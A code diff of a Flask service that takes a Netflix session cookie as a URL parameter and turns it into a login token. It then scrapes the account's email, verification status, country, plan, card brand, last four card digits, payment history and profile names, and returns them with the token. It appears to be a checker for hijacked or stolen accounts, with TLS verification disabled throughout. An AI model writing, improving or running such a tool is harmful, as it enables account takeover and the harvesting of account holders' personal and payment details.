@@ -13,7 +13,6 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 app = Flask(__name__)
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-CHECK_URL = "https://www.netflix.com/api/shakti/mre/pathEvaluator"
 
 QUERY_PARAMS = {
     "appVersion": "15.48.1",
@@ -66,6 +65,12 @@ BASE_HEADERS = {
     "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
+WEB_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml",
+    "Accept-Language": "en-US,en;q=0.9",
+}
+
 COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
 
 COUNTRY_FLAGS = {
@@ -88,12 +93,11 @@ COUNTRY_FLAGS = {
     "PE": "🇵🇪", "VE": "🇻🇪", "EC": "🇪🇨", "BO": "🇧🇴", "PY": "🇵🇾",
     "UY": "🇺🇾", "CR": "🇨🇷", "PA": "🇵🇦", "GT": "🇬🇹", "HN": "🇭🇳",
     "SV": "🇸🇻", "NI": "🇳🇮", "DO": "🇩🇴", "CU": "🇨🇺", "JM": "🇯🇲",
-    "PL": "🇵🇱", "BG": "🇧🇬", "HR": "🇭🇷", "RS": "🇷🇸", "SK": "🇸🇰",
-    "SI": "🇸🇮", "LT": "🇱🇹", "LV": "🇱🇻", "EE": "🇪🇪", "BY": "🇧🇾",
-    "MD": "🇲🇩", "AL": "🇦🇱", "MK": "🇲🇰", "BA": "🇧🇦", "ME": "🇲🇪",
-    "XK": "🇽🇰", "IS": "🇮🇸", "LU": "🇱🇺", "MT": "🇲🇹", "CY": "🇨🇾",
-    "GE": "🇬🇪", "AM": "🇦🇲", "AZ": "🇦🇿", "KZ": "🇰🇿", "UZ": "🇺🇿",
-    "TM": "🇹🇲", "KG": "🇰🇬", "TJ": "🇹🇯",
+    "BG": "🇧🇬", "HR": "🇭🇷", "RS": "🇷🇸", "SK": "🇸🇰", "SI": "🇸🇮",
+    "LT": "🇱🇹", "LV": "🇱🇻", "EE": "🇪🇪", "BY": "🇧🇾", "MD": "🇲🇩",
+    "AL": "🇦🇱", "MK": "🇲🇰", "BA": "🇧🇦", "ME": "🇲🇪", "IS": "🇮🇸",
+    "LU": "🇱🇺", "MT": "🇲🇹", "CY": "🇨🇾", "GE": "🇬🇪", "AM": "🇦🇲",
+    "AZ": "🇦🇿", "KZ": "🇰🇿", "UZ": "🇺🇿", "TM": "🇹🇲", "KG": "🇰🇬",
 }
 
 def decode_value(value):
@@ -152,6 +156,15 @@ def format_expiry(expires):
 def get_flag(country_code):
     return COUNTRY_FLAGS.get(country_code.upper(), "🌍") if country_code else "🌍"
 
+def decode_profile_name(name):
+    try:
+        return name.encode('utf-8').decode('unicode_escape').encode('latin1').decode('utf-8')
+    except:
+        try:
+            return name.encode().decode('unicode_escape')
+        except:
+            return name
+
 @app.route("/withdraw", methods=["GET"])
 def withdraw():
     cookie_raw = request.args.get("cookie", "")
@@ -175,28 +188,37 @@ def scrape():
         cookie_dict = extract_cookie_dict(cookie_raw)
         token, expires = fetch_nftoken(cookie_dict)
 
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml",
-            "Accept-Language": "en-US,en;q=0.9",
-        }
+        account_url = "https://www.netflix.com/account?nftoken=" + token
 
         # Page 1 - Account page
-        account_url = "https://www.netflix.com/account?nftoken=" + token
-        response = requests.get(account_url, headers=headers, timeout=30, verify=False, allow_redirects=True)
+        response = requests.get(
+            account_url,
+            headers=WEB_HEADERS,
+            timeout=30,
+            verify=False,
+            allow_redirects=True
+        )
         html = response.text
-
-        # Get session cookies from account page
         session_cookies = response.cookies
 
-        # Page 2 - Security page for email verified
-        security_url = "https://www.netflix.com/account/security"
-        response2 = requests.get(security_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
+        # Page 2 - Security page
+        response2 = requests.get(
+            "https://www.netflix.com/account/security",
+            headers=WEB_HEADERS,
+            cookies=session_cookies,
+            timeout=30,
+            verify=False
+        )
         html2 = response2.text
 
-        # Page 3 - Billing page for payment history
-        billing_url = "https://www.netflix.com/billingActivity"
-        response3 = requests.get(billing_url, headers=headers, cookies=session_cookies, timeout=30, verify=False)
+        # Page 3 - Billing page forced English
+        response3 = requests.get(
+            "https://www.netflix.com/billingActivity",
+            headers=WEB_HEADERS,
+            cookies=session_cookies,
+            timeout=30,
+            verify=False
+        )
         html3 = response3.text
 
         result = {}
@@ -208,17 +230,25 @@ def scrape():
                 result["email"] = m.group(1).replace("\\x40", "@").replace("\\u0040", "@")
                 break
 
-        # Email verified - check security page HTML text
-        if "Verified" in html2 or '"emailVerified":true' in html2 or '"emailVerified": true' in html2:
-            result["email_verified"] = "✅ Verified"
-        else:
-            result["email_verified"] = "❌ Not Verified"
+        # Email verified
+        email_verified = "❌ Not Verified"
+        for p in [r'"emailVerified"\s*:\s*(true|false)', r'"isEmailVerified"\s*:\s*(true|false)']:
+            m = re.search(p, html)
+            if m:
+                email_verified = "✅ Verified" if m.group(1) == "true" else "❌ Not Verified"
+                break
+        if "Verified" in html2 and email_verified == "❌ Not Verified":
+            email_verified = "✅ Verified"
+        result["email_verified"] = email_verified
 
         # Phone verified
-        if "Mobile phone" in html2 and ("Verified" in html2 or len(re.findall(r'\d{5}\s*\d{5}', html2)) > 0):
-            result["phone_verified"] = "✅ Verified"
-        else:
-            result["phone_verified"] = "❌ Not Verified"
+        phone_verified = "❌ Not Verified"
+        m = re.search(r'"phoneVerified"\s*:\s*(true|false)', html)
+        if m and m.group(1) == "true":
+            phone_verified = "✅ Verified"
+        elif "Mobile phone" in html2 and re.search(r'\d{5}', html2):
+            phone_verified = "✅ Verified"
+        result["phone_verified"] = phone_verified
 
         # Country
         m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html)
@@ -249,7 +279,7 @@ def scrape():
                     result["plan"] = plan
                     break
 
-        # Payment - card type + last4
+        # Payment - card type
         card_type = ""
         last4 = ""
         for p in [r'"cardType"\s*:\s*"([^"]+)"', r'"brand"\s*:\s*"([^"]+)"', r'"cardBrand"\s*:\s*"([^"]+)"']:
@@ -257,19 +287,21 @@ def scrape():
             if m:
                 card_type = m.group(1)
                 break
+
+        # Last4 from account page
         for p in [r'"last4Digits"\s*:\s*"([^"]+)"', r'"last4"\s*:\s*"([^"]+)"', r'"lastFourDigits"\s*:\s*"([^"]+)"']:
             m = re.search(p, html)
             if m:
                 last4 = m.group(1)
                 break
 
-                # Last4 from billing page
+        # Last4 from billing page
         if not last4:
-            m = re.search(r'(?:VISA|Mastercard|AMEX)[^<]*?(\d{4})', html3, re.IGNORECASE)
+            m = re.search(r'(?:VISA|Mastercard|AMEX|Discover)[^\d]*(\d{4})', html3, re.IGNORECASE)
             if m:
                 last4 = m.group(1)
         if not last4:
-            m = re.search(r'(\d{4})\s*\n', html3)
+            m = re.search(r'(\d{4})\s*</', html3)
             if m:
                 last4 = m.group(1)
 
@@ -296,43 +328,46 @@ def scrape():
                         result["payment"] = ptype
                     break
             if "payment" not in result:
-                m = re.search(r'(Mastercard|Visa|PayPal|AMEX|Discover|UPI|SEPA)[^\d]*(\d{4})?', html, re.IGNORECASE)
+                m = re.search(r'(Mastercard|Visa|PayPal|AMEX|Discover|UPI|SEPA)[^\d]*(\d{4})?', html3, re.IGNORECASE)
                 if m:
                     result["payment"] = f"{m.group(1)} - {m.group(2)}" if m.group(2) else m.group(1)
                 else:
                     result["payment"] = "Unknown"
 
-        # Payment history - find amounts next to dates in table
-        # Pattern: date followed eventually by total amount
-        # Look for rows with membership dates
-        rows = re.findall(r'\d{1,2}/\d{1,2}/\d{4}.*?(?:₹|€|\$|£)([\d,]+)(?:\s*<)', html3, re.DOTALL)
-        
-        currency = "₹" if "₹" in html3 else ("€" if "€" in html3 else "$")
+        # Payment history - find amounts from billing table
+        currency_match = re.search(r'([₹$€£¥]|INR|USD|EUR|GBP)\s*[\d]', html3)
+        currency = ""
+        if currency_match:
+            c = currency_match.group(1)
+            currency_map = {"INR": "₹", "USD": "$", "EUR": "€", "GBP": "£"}
+            currency = currency_map.get(c, c)
 
-        if rows:
-            clean = []
-            for r in rows:
-                r = r.replace(",", "")
-                try:
-                    val = float(r)
-                    if val > 100:  # skip tiny amounts
-                        clean.append(currency + r)
-                except:
-                    pass
-            result["payment_history"] = ", ".join(clean[:3]) if clean else "Unknown"
-        else:
-            # Last resort - find all bold/strong amounts in billing section
-            idx = html3.find("Payment History")
-            if idx > 0:
-                section = html3[idx:idx+10000]
-                # Find amounts that are whole numbers (not decimals = not taxes)
-                whole_amounts = re.findall(r'(?<!\.)(?:₹|€|\$|£)\s*(\d{3,4})(?!\d)(?!\.\d)', section)
-                if whole_amounts:
-                    result["payment_history"] = ", ".join([currency + a for a in whole_amounts[:3]])
-                else:
-                    result["payment_history"] = "Unknown"
+        # Find amounts after "Payment History" section
+        idx = html3.find("Payment History")
+        if idx < 0:
+            # Try local language versions
+            for term in ["Riwayat Pembayaran", "Historial de pagos", "Historique des paiements", "Zahlungsverlauf"]:
+                idx = html3.find(term)
+                if idx >= 0:
+                    break
+
+        if idx >= 0:
+            section = html3[idx:idx+15000]
+            # Find whole number amounts (not decimals = not taxes)
+            amounts = re.findall(r'(?:₹|INR\s*|USD\s*|\$|€|£)\s*(\d{2,4})(?!\d)(?!\.\d)', section)
+            if amounts:
+                seen = []
+                clean = []
+                for a in amounts:
+                    if a not in seen and int(a) > 50:
+                        seen.append(a)
+                        clean.append(currency + a if currency else a)
+                # Skip first (upcoming) take next 3
+                result["payment_history"] = ", ".join(clean[1:4]) if len(clean) > 1 else ", ".join(clean[:3])
             else:
                 result["payment_history"] = "Unknown"
+        else:
+            result["payment_history"] = "Unknown"
 
         # Extra members
         m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
@@ -342,9 +377,12 @@ def scrape():
         else:
             result["extra_members"] = "No ❌"
 
-        # Profiles
-        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html)
-        result["profiles"] = ", ".join(list(set(profiles))) if profiles else "Unknown"
+        # Profiles - decode unicode
+        profiles_raw = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html)
+        clean_profiles = []
+        for p in profiles_raw:
+            clean_profiles.append(decode_profile_name(p))
+        result["profiles"] = ", ".join(list(set(clean_profiles))) if clean_profiles else "Unknown"
 
         result["token"] = token
         result["expires"] = format_expiry(expires)
